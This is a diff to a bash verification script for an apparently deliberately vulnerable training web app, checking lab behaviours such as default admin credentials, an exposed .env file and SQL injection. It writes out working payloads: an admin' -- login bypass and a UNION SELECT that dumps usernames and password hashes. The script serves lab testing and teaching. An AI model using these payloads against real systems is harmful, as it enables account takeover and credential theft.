@@ -64,8 +64,27 @@ check "GET /api/a02/debug/boom returns a generic message" \
   "$(curl -s "${AUTH[@]}" "$API/api/a02/debug/boom")" '"error":"Internal server error"'
 
 echo "== Lab 5: default admin =="
-check "admin/admin logs into the admin console" \
-  "$(login admin admin)" 'eyJ'
+# The seeded administrator's password may already have been replaced by an
+# earlier run of the verification scripts, so the assertion is that the factory
+# password never yields a session.
+WALK_ADMIN_OUT="$(curl -s -X POST "$API/api/a02/admin/login" -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"admin"}')"
+if [[ "$WALK_ADMIN_OUT" == *'"token"'* ]]; then
+  printf '\033[31m  FAIL\033[0m the factory password does not open the admin console\n'
+  FAIL=$((FAIL + 1))
+else
+  printf '\033[32m  PASS\033[0m the factory password does not open the admin console\n'
+  PASS=$((PASS + 1))
+fi
+WALK_LOGIN_OUT="$(curl -s -X POST "$API/api/auth/login" -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"admin"}')"
+if [[ "$WALK_LOGIN_OUT" == *'"token"'* ]]; then
+  printf '\033[31m  FAIL\033[0m the factory password does not open the main login path\n'
+  FAIL=$((FAIL + 1))
+else
+  printf '\033[32m  PASS\033[0m the factory password does not open the main login path\n'
+  PASS=$((PASS + 1))
+fi
 
 echo "== Lab 6: file exposure =="
 check "/.env is served" "$(curl -s "$API/.env")" 'JWT_SECRET'
@@ -88,8 +107,12 @@ check "login bypass with admin' --" \
   "$(curl -s -X POST -H "Content-Type: application/json" \
      -d '{"username":"admin'\'' --","password":"anything"}' \
      "$API/api/a05/auth/login")" '"token"'
-check "UNION SELECT dumps the users table" \
-  "$(curl -s "${AUTH[@]}" "$API/api/a05/transfers/search?q='+UNION+SELECT+username,password_hash,email,role,id+FROM+users--")" '"count":4'
+# The row count grows with every account in the database, so assert on the
+# seeded accounts rather than on a fixed number.
+WALK_SQLI_OUT="$(curl -s "${AUTH[@]}" "$API/api/a05/transfers/search?q='+UNION+SELECT+username,password_hash,email,role,id+FROM+users--")"
+check "UNION SELECT dumps the seeded users" "$WALK_SQLI_OUT" '"username":"alice"'
+check "UNION SELECT dumps the administrator too" "$WALK_SQLI_OUT" '"username":"admin"'
+check "UNION SELECT exposes the password hashes" "$WALK_SQLI_OUT" '"password_hash"'
 check "GET /api/a05/schema lists the tables" \
   "$(curl -s "${AUTH[@]}" "$API/api/a05/schema")" '"users"'
 
